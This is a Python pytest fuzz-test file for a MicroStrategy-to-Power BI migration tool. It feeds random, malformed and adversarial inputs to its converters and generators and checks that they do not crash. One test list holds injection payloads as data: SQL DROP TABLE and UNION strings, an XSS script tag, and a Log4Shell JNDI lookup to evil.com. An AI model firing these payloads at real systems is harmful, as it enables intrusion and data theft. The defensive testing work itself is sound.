"""
Fuzz tests for v10.0 — Deep Testing & Quality (Sprint Z.3).

Feeds random, malformed, edge-case, and adversarial inputs to core
modules.  The invariant: modules must NEVER crash with an unhandled
exception.  They must always return a valid output or raise a known
exception type.
"""

import json
import os
import random
import string
import sys

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from microstrategy_export.expression_converter import (
    convert_mstr_expression_to_dax,
    convert_metric_to_dax,
)
from microstrategy_export.connection_mapper import map_connection_to_m_query
from powerbi_import.tmdl_generator import (
    _map_data_type,
    generate_table_tmdl,
    generate_relationships_tmdl,
)
from powerbi_import.visual_generator import (
    _convert_visualization,
    _build_data_bindings,
)
from powerbi_import.validator import validate_dax_references
from powerbi_import.m_query_generator import generate_m_partition
from powerbi_import.pbip_generator import generate_pbip
from powerbi_import.ai_converter import validate_dax_syntax


_RNG = random.Random(12345)


def _rand_str(min_len=0, max_len=50):
    """Generate a random string."""
    length = _RNG.randint(min_len, max_len)
    chars = string.ascii_letters + string.digits + " (){}[]<>+-*/=!@#$%^&_.,;:'\"\\\t\n"
    return ''.join(_RNG.choice(chars) for _ in range(length))


def _rand_unicode(min_len=1, max_len=30):
    """Generate a random unicode string."""
    length = _RNG.randint(min_len, max_len)
    return ''.join(chr(_RNG.randint(0x20, 0xFFFF)) for _ in range(length))


# ═══════════════════════════════════════════════════════════════════
# FUZZ 1: Expression converter — random strings never crash
# ═══════════════════════════════════════════════════════════════════

class TestFuzzExpressionConverter:

    _RANDOM_INPUTS = [_rand_str() for _ in range(30)]

    @pytest.mark.parametrize("expr", _RANDOM_INPUTS)
    def test_random_string_no_crash(self, expr):
        result = convert_mstr_expression_to_dax(expr)
        assert isinstance(result, dict)
        assert "dax" in result
        assert "fidelity" in result

    _MALFORMED = [
        "(((",
        ")))",
        "Sum(",
        "Sum()",
        "Sum(Revenue",
        ")))Sum(Revenue)))",
        'ApplySimple("',
        'ApplySimple("", , , , )',
        "Rank()",
        "Lag(, )",
        "Lead(Revenue, )",
        "NTile(Revenue, 0)",
        "RunningSum()",
        "MovingAvg(, 0)",
        "{~+}",
        "{^}",
        "{!}",
        "Sum(Revenue) {~+, }",
        "Sum(Revenue) {~+, , , }",
        "If(, , )",
        "Concat(, )",
        "SubStr(, , )",
        "DaysBetween(, )",
    ]

    @pytest.mark.parametrize("expr", _MALFORMED)
    def test_malformed_no_crash(self, expr):
        result = convert_mstr_expression_to_dax(expr)
        assert isinstance(result, dict)
        assert "dax" in result

    _SQL_INJECTION = [
        "'; DROP TABLE users; --",
        "1 OR 1=1",
        "UNION SELECT * FROM passwords",
        "<script>alert('xss')</script>",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}",
    ]

    @pytest.mark.parametrize("expr", _SQL_INJECTION)
    def test_injection_no_crash(self, expr):
        result = convert_mstr_expression_to_dax(expr)
        assert isinstance(result, dict)

    _UNICODE_INPUTS = [_rand_unicode() for _ in range(10)]

    @pytest.mark.parametrize("expr", _UNICODE_INPUTS)
    def test_unicode_no_crash(self, expr):
        result = convert_mstr_expression_to_dax(expr)
        assert isinstance(result, dict)

    _VERY_LONG = [
        "Sum(" * 100 + "Revenue" + ")" * 100,
        "A" * 10000,
        "Sum(Revenue) {~+, " + ", ".join(f"Attr{i}" for i in range(50)) + "}",
    ]

    @pytest.mark.parametrize("expr", _VERY_LONG)
    def test_very_long_no_crash(self, expr):
        result = convert_mstr_expression_to_dax(expr)
        assert isinstance(result, dict)

    _APPLY_FUZZ = [
        'ApplySimple("SELECT 1", Col)',
        'ApplySimple("", )',
        'ApplySimple("#0 + #1 + #2 + #3 + #4", A, B, C, D, E)',
        'ApplyAgg("SUM(#0)", Revenue)',
        'ApplyAgg("", )',
        'ApplyOLAP("ROW_NUMBER()", )',
        'ApplyOLAP("", Revenue)',
        'ApplyLogic("AND(#0, #1)", A, B)',
        'ApplyComparison("#0 > #1", A, B)',
    ]

    @pytest.mark.parametrize("expr", _APPLY_FUZZ)
    def test_apply_fuzz_no_crash(self, expr):
        result = convert_mstr_expression_to_dax(expr)
        assert isinstance(result, dict)

    _NESTED = [
        "Sum(Avg(Revenue))",
        "NullToZero(Sum(Avg(Revenue)))",
        "If(Sum(Revenue) > Avg(Cost), Sum(Revenue), Avg(Cost))",
        "Rank(Sum(Revenue)) {~+, Year}",
        "Lag(Sum(NullToZero(Revenue)), 1)",
    ]

    @pytest.mark.parametrize("expr", _NESTED)
    def test_nested_no_crash(self, expr):
        result = convert_mstr_expression_to_dax(expr)
        assert isinstance(result, dict)


# ═══════════════════════════════════════════════════════════════════
# FUZZ 2: Connection mapper — bizarre inputs
# ═══════════════════════════════════════════════════════════════════

class TestFuzzConnectionMapper:

    @pytest.mark.parametrize("conn", [
        {},
        {"db_type": None},
        {"db_type": ""},
        {"db_type": "sql_server"},
        {"db_type": _rand_str(1, 20)},
        {"db_type": "sql_server", "server": "", "database": ""},
        {"db_type": "oracle", "server": None},
    ])
    def test_random_conn_no_crash(self, conn):
        result = map_connection_to_m_query(conn, table_name="T")
        assert isinstance(result, str)

    @pytest.mark.parametrize("table_name", [
        "", "T", "A" * 500, "table with spaces", "table'quotes",
        "table;drop", None,
    ])
    def test_random_table_name_no_crash(self, table_name):
        conn = {"db_type": "sql_server", "server": "s", "database": "d"}
        result = map_connection_to_m_query(conn, table_name=table_name)
        assert isinstance(result, str)


# ═══════════════════════════════════════════════════════════════════
# FUZZ 3: Data type mapper — random types
# ═══════════════════════════════════════════════════════════════════

class TestFuzzDataTypeMapper:

    _RANDOM_TYPES = [_rand_str(1, 15) for _ in range(20)]

    @pytest.mark.parametrize("type_str", _RANDOM_TYPES)
    def test_random_type_no_crash(self, type_str):
        result = _map_data_type(type_str)
        assert isinstance(result, str)
        assert len(result) > 0


# ═══════════════════════════════════════════════════════════════════
# FUZZ 4: TMDL generation — edge case datasources
# ═══════════════════════════════════════════════════════════════════

class TestFuzzTmdlGenerator:

    def test_empty_columns(self):
        ds = {"id": "t1", "name": "Empty",
              "columns": [], "db_connection": {"db_type": "sql_server"}}
        result = generate_table_tmdl(ds, [], [], [], [], [], {})
        assert "table Empty" in result

    def test_single_column(self):
        ds = {"id": "t2", "name": "Single",
              "columns": [{"name": "C1", "data_type": "integer"}],
              "db_connection": {"db_type": "oracle"}}
        result = generate_table_tmdl(ds, [], [], [], [], [], {})
        assert "C1" in result

    def test_many_columns(self):
        cols = [{"name": f"Col_{i}", "data_type": "string"} for i in range(100)]
        ds = {"id": "t3", "name": "Big", "columns": cols,
              "db_connection": {"db_type": "postgresql"}}
        result = generate_table_tmdl(ds, [], [], [], [], [], {})
        assert "Col_0" in result
        assert "Col_99" in result

    def test_special_chars_in_table_name(self):
        ds = {"id": "t4", "name": "My Table",
              "columns": [{"name": "ID", "data_type": "integer"}],
              "db_connection": {"db_type": "sql_server"}}
        result = generate_table_tmdl(ds, [], [], [], [], [], {})
        assert "My Table" in result

    def test_no_db_connection(self):
        ds = {"id": "t5", "name": "NoDB",
              "columns": [{"name": "X", "data_type": "string"}],
              "db_connection": {}}
        result = generate_table_tmdl(ds, [], [], [], [], [], {})
        assert isinstance(result, str)

    def test_empty_relationships(self):
        result = generate_relationships_tmdl([])
        assert isinstance(result, str)


# ═══════════════════════════════════════════════════════════════════
# FUZZ 5: Visual conversion — edge cases
# ═══════════════════════════════════════════════════════════════════

class TestFuzzVisualGenerator:

    def test_unknown_viz_type(self):
        viz = {
            "viz_type": "nonexistent_chart",
            "pbi_visual_type": "tableEx",
            "data": {"attributes": [], "metrics": []},
            "position": {},
            "formatting": {},
            "thresholds": [],
            "key": "fuzz1",
            "name": "Fuzz",
        }
        result = _convert_visualization(viz, 1024, 768)
        assert result is not None
        assert result["visual"]["visualType"] == "tableEx"

    def test_empty_data(self):
        viz = {
            "viz_type": "grid",
            "data": {"attributes": [], "metrics": []},
            "position": {},
            "formatting": {},
            "thresholds": [],
            "key": "fuzz2",
            "name": "Empty",
        }
        result = _convert_visualization(viz, 1024, 768)
        assert result is not None

    def test_missing_position(self):
        viz = {
            "viz_type": "line",
            "data": {"attributes": [{"id": "a1", "name": "Cat"}],
                     "metrics": [{"id": "m1", "name": "Val"}]},
            "formatting": {},
            "thresholds": [],
            "key": "fuzz3",
            "name": "NoPos",
        }
        result = _convert_visualization(viz, 1024, 768)
        assert result is not None

    @pytest.mark.parametrize("viz_type", list(_rand_str(3, 15) for _ in range(5)))
    def test_random_viz_types_no_crash(self, viz_type):
        viz = {
            "viz_type": viz_type,
            "pbi_visual_type": "tableEx",
            "data": {"attributes": [], "metrics": []},
            "position": {"x": 0, "y": 0, "width": 100, "height": 100},
            "formatting": {},
            "thresholds": [],
            "key": "rand",
            "name": "Random",
        }
        result = _convert_visualization(viz, 1024, 768)
        assert result is not None


# ═══════════════════════════════════════════════════════════════════
# FUZZ 6: DAX validation — random strings
# ═══════════════════════════════════════════════════════════════════

class TestFuzzDaxValidation:

    _RANDOM_DAX = [_rand_str(0, 100) for _ in range(20)]

    @pytest.mark.parametrize("dax", _RANDOM_DAX)
    def test_random_dax_no_crash(self, dax):
        result = validate_dax_syntax(dax)
        assert isinstance(result, dict)
        assert "valid" in result
        assert isinstance(result["valid"], bool)

    _EDGE_CASES = [
        "",
        " ",
        "()",
        "((()))",
        "SUM()",
        "42",
        "/* comment */",
        "VAR x = 1\nRETURN x",
        "SUM([" + "A" * 1000 + "])",
    ]

    @pytest.mark.parametrize("dax", _EDGE_CASES)
    def test_edge_case_no_crash(self, dax):
        result = validate_dax_syntax(dax)
        assert isinstance(result, dict)


# ═══════════════════════════════════════════════════════════════════
# FUZZ 7: PBIP generation — minimal/edge data
# ═══════════════════════════════════════════════════════════════════

class TestFuzzPbipGeneration:

    def test_completely_empty_data(self, tmp_path):
        data = {k: [] for k in [
            "datasources", "attributes", "facts", "metrics",
            "derived_metrics", "reports", "dossiers", "cubes",
            "filters", "prompts", "custom_groups", "consolidations",
            "hierarchies", "relationships", "security_filters",
            "freeform_sql", "thresholds", "subtotals",
        ]}
        stats = generate_pbip(data, str(tmp_path), report_name="FuzzEmpty")
        assert isinstance(stats, dict)
        assert (tmp_path / "FuzzEmpty.pbip").exists()

    def test_data_with_empty_datasource(self, tmp_path):
        data = {k: [] for k in [
            "datasources", "attributes", "facts", "metrics",
            "derived_metrics", "reports", "dossiers", "cubes",
            "filters", "prompts", "custom_groups", "consolidations",
            "hierarchies", "relationships", "security_filters",
            "freeform_sql", "thresholds", "subtotals",
        ]}
        data["datasources"] = [{
            "id": "t1", "name": "Fuzz",
            "physical_table": "Fuzz",
            "columns": [],
            "db_connection": {"db_type": "sql_server", "server": "s",
                              "database": "d", "schema": "dbo"},
        }]
        stats = generate_pbip(data, str(tmp_path), report_name="FuzzDS")
        assert stats["tables"] >= 1


# ═══════════════════════════════════════════════════════════════════
# FUZZ 8: generate_m_partition — edge cases
# ═══════════════════════════════════════════════════════════════════

class TestFuzzMPartition:

    @pytest.mark.parametrize("ds", [
        {"name": "T", "db_connection": {}},
        {"name": "T", "db_connection": {"db_type": "sql_server"}},
        {"name": "T", "physical_table": "", "db_connection": {"db_type": "oracle"}},
        {"name": "", "db_connection": {"db_type": "postgresql", "server": "s", "database": "d"}},
    ])
    def test_edge_datasource_no_crash(self, ds):
        result = generate_m_partition(ds)
        assert isinstance(result, str)


# ═══════════════════════════════════════════════════════════════════
# FUZZ 9: Metric definition edge cases
# ═══════════════════════════════════════════════════════════════════

class TestFuzzMetricDefs:

    _METRICS = [
        {},
        {"name": "M"},
        {"name": "M", "expression": None, "metric_type": "simple"},
        {"expression": "Sum(X)"},
        {"name": "M", "expression": "Sum(X)", "metric_type": "unknown_type"},
        {"name": "M", "expression": _rand_str(0, 200), "metric_type": "simple"},
    ]

    @pytest.mark.parametrize("metric", _METRICS)
    def test_metric_def_no_crash(self, metric):
        result = convert_metric_to_dax(metric)
        assert isinstance(result, dict)
        assert "dax" in result
